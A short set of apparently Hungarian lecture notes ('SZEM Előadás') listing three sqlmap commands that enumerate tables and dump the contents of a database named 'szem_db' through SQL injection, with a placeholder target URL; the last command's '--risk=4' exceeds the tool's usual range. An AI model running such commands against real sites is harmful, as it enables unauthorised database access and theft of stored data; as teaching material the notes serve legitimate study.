SZEM Előadás
============

SQLmap notes:
sqlmap.py -u "url" -D szem_db --tables
sqlmap.py -u "url" -D szem_db --dump
sqlmap.py -u "url" --flush-session --level=5 --risk=4 --dump-all